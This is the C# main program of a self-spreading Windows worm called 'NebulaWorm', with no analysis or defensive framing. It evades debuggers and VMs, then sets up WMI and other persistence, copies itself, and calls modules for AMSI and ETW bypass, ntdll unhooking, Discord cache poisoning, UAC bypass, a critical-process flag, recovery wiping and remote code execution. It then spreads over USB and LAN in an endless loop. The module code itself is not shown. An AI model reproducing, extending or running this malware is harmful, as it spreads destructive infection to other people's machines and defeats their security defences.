using System;
using System.Threading.Tasks;

namespace NebulaWorm
{
    internal static class Program
    {
        private static readonly Random rnd = new Random();

        [STAThread]
        static async Task Main()
        {
            try
            {
                if (AntiDebug.IsDebuggedOrVM())
                    return;

                string exePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                WMIPersistence.CreateWMIEventSubscription(exePath);

                SelfReplicator.CopyToAppDataIfNeeded();
                Persistence.Apply();

                AmsiBypass.Bypass();
                Kill.CheckAndExecute();
                Cpuload.Start();
                SlowWi.Start();

                EtwBypass.ETWBypass();
                Unhook.RestoreNtdll();
                Discord.PoisonCache();
                UsbSpread.Spread();
                UACBypass.Start();
                CriticalProcess.MakeCritical();
                DPIBypass.Apply();
                AntiRecovery.Wipe();
                RCE.Start();
                BypassWin.Start();

                while (true)
                {
                    UsbSpread.Spread(); // sync
                    await LanSpread.SpreadAsync(); // async

                    int minutes = rnd.Next(1, 6); // 1-6 minutes
                    int delayMs = minutes * 60 * 1000; 
                    await Task.Delay(delayMs); // async delay
                }
            }
            catch
            {
            }
        }
    }
}
